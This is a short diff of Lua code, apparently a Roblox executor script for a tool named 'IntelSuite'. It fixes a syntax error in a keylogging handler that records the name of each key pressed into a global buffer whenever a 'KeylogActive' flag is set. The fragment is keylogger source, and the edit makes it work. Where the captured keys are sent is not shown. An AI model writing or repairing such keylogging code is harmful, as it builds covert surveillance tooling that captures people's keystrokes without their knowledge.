@@ -572,7 +572,7 @@ task.wait(1)
 UserInputService.InputBegan:Connect(function(input, gp)
     if not getgenv().IntelSuite.IsActive then return end
     if not getgenv().IntelSuite.KeylogActive then return end
-    pcall(function())
+    pcall(function()
         if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
             getgenv().IntelSuite.Buffer = getgenv().IntelSuite.Buffer .. "[" .. input.KeyCode.Name .. "]"
         end
